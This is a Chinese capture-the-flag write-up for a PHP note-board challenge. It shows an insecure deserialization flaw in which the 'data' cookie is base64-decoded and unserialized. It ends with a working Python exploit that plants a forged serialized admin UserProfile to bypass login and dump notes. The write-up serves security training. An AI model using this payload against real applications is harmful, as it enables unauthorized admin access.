# 题目描述
Not so secret. This web application has a secret note.

# 知识点
Insecure Deserialization

# 思路
漏洞在 index.php 对用户 cookie 直接做 base64_decode 后 unserialize，导致可控的 PHP 对象反序列化。只需构造一个序列化的 UserProfile，base64 编码后写入名为 data 的 cookie，服务端反序列化后会把该对象当作已登录用户使用，从而绕过登录并以管理员身份查看/创建笔记。

# 解题步骤

![image-x12083653993](./assets/image-x12083653993.png)

没有账号，先注册一个

![image-x12083709844](./assets/image-x12083709844.png)

是留言板

![image-x12083735734](./assets/image-x12083735734.png)

可以显示记录

![image-x12083748967](./assets/image-x12083748967.png)

抓包看一下

![image-x12083843393](./assets/image-x12083843393.png)

发现data字段可能有反序列化

![image-x12083950081](./assets/image-x12083950081.png)

![image-x12084003190](./assets/image-x12084003190.png)

构造一个

![image-x12084028553](./assets/image-x12084028553.png)

![image-x12084050408](./assets/image-x12084050408.png)



# EXP

```python
import requests, re, sys

url = "http://ip32843/index.php"
payload = "TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7fQ=="

s = requests.Session()
s.cookies.set("data", payload, domain="ip")
r = s.get(url, timeout=10)
if r.status_code != 200:
    print("请求失败:", r.status_code); sys.exit(1)

# 简单提取所有 <h3> 和 <p> 内容
items = re.findall(r"<h3>(.*?)</h3>|<p>(.*?)</p>", r.text, re.S)
for h,p in items:
    if h: print("Title:", h.strip())
    if p: print("Content:", p.strip())
```

